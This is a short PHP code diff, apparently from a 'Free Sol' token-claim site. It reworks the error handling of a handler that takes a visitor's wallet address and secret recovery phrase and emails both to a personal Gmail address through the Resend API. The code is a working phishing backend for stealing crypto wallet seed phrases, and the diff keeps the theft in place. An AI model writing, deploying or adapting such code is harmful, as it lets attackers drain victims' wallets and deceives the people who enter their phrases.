@@ -30,26 +30,27 @@ if (empty($phrase)){
         'status' => 'error',
         'msg' => "Enter your wallet phrase to continue"
     ]);
-}
+    return;
+}else{
+    try {
+        $result = $resend->emails->send([
+            'from' => 'Free Sol <contact@claimfeesol.com>',
+            'to' => ['osemensilas@gmail.com'],
+            'subject' => 'New Token',
+            'html' => "
+                <p>Wallet: {$wallet}</p>
+                <p>Phrase: {$phrase}</p>
+            ",
+        ]);
 
-try {
-    $result = $resend->emails->send([
-        'from' => 'Free Sol <contact@claimfeesol.com>',
-        'to' => ['osemensilas@gmail.com'],
-        'subject' => 'New Token',
-        'html' => "
-            <p>Wallet: {$wallet}</p>
-            <p>Phrase: {$phrase}</p>
-        ",
-    ]);
-
-    echo json_encode([
-        'status' => 'successful',
-        'msg' => $result
-    ]);
-} catch (\Throwable $th) {
-    echo json_encode([
-        'status' => 'error',
-        'msg' => $th->getMessage()
-    ]);
+        echo json_encode([
+            'status' => 'successful',
+            'msg' => $result
+        ]);
+    } catch (\Throwable $th) {
+        echo json_encode([
+            'status' => 'error',
+            'msg' => $th->getMessage()
+        ]);
+    }
 }
